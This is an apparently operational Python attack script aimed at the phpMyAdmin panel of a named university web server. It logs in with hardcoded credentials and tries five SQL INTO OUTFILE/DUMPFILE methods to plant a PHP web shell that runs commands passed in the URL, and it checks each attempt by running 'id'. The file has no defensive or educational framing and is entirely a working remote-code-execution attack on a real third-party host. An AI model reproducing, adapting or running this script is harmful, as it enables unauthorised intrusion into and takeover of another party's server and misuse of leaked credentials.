#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 通过phpMyAdmin的文件上传功能
print("[*] 方法1: 文件上传功能...")
# 创建包含shell的SQL文件
sql_content = """SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';
"""
files = {"import_file": ("shell.sql", sql_content, "application/sql")}
data = {
    "format": "sql",
    "token": token,
    "db": "scmeeting",
    "sql_compatibility": "NONE",
    "import_type": "sql",
    "charset_of_file": "utf-8",
    "skip_queries": "0",
}

import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=15)

time.sleep(3)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法2: 通过phpMyAdmin的SQL执行，尝试写入到phpMyAdmin themes目录
print("[*] 方法2: 写入到phpMyAdmin themes目录...")
theme_paths = [
    "/var/www/phpmyadmin/themes/pmahomme/shell.php",
    "/usr/share/phpmyadmin/themes/pmahomme/shell.php",
]

for theme_path in theme_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{theme_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    test_url = url + "themes/pmahomme/shell.php?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 方法3: 通过phpMyAdmin的SQL执行，写入到已知可写目录
print("[*] 方法3: 写入到已知可写目录...")
writable_paths = [
    "/tmp/shell.php",
    "/var/tmp/shell.php",
    "/dev/shm/shell.php",
]

for writable_path in writable_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{writable_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 如果写入成功，尝试通过文件包含访问
    # 但需要先找到文件包含漏洞

# 方法4: 通过phpMyAdmin的SQL执行，使用DUMPFILE替代OUTFILE
print("[*] 方法4: 使用DUMPFILE...")
dump_paths = [
    "/var/www/html/enmeeting/shell.php",
    "/var/www/html/shell.php",
]

for dump_path in dump_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO DUMPFILE '{dump_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    http_path = dump_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 方法5: 通过phpMyAdmin的SQL执行，写入到当前数据库目录
print("[*] 方法5: 写入到数据库目录...")
sql = "SELECT @@datadir;"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 提取datadir
import html
content = resp.text
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    if clean and '/' in clean and 'mysql' in clean.lower():
        datadir = clean
        print(f"[*] datadir: {datadir}")
        # 尝试写入到datadir的上级目录
        parent_dir = '/'.join(datadir.split('/')[:-1])
        write_path = f"{parent_dir}/shell.php"
        sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{write_path}';"
        sql_data = {"sql_query": sql, "db": "mysql"}
        session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

print("[-] 继续尝试...")
